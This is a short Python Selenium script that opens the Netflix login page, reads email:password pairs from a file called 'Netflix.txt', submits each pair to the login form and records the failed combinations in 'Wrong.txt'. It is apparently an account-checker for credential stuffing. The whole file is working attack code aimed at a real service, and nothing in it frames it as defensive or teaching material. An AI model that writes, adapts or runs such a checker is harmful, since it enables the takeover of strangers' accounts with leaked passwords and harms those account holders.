import time
from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as ec
from curses import version
browser = webdriver.Firefox()
wait = WebDriverWait(browser, 7)
browser.get("https://www.netflix.com/sa-en/login")

with open("Netflix.txt", "rb") as f:

        for line in f:
            try:
                emailbrowse = WebDriverWait(browser, 5).until(ec.visibility_of_element_located((By.ID, "id_userLoginId")))
                emailbrowse.clear()
                passwordbrowse = WebDriverWait(browser, 5).until(ec.visibility_of_element_located((By.ID, "id_password")))
                submitbutt = WebDriverWait(browser, 5).until(ec.visibility_of_element_located((By.XPATH, "/html/body/div[1]/div/div[3]/div/div/div[1]/form/button[@type='submit']")))
                line = line.decode('utf-8')
                email = line.strip()
                email, password = email.split(":")
                emailbrowse.clear()
                emailbrowse.send_keys(email)
                passwordbrowse.send_keys(password)
                submitbutt.click()
                time.sleep(5)
                page_source = browser.page_source

                if "Incorrect password." in page_source:
                    with open("Wrong.txt", "a") as wrong:
                        wrong.write(email + ":" + password + "\n")
                        print("Wrong " + email + ":" + password + "\n")
                    pass
            except Exception as err:
                print(err)
browser.close()
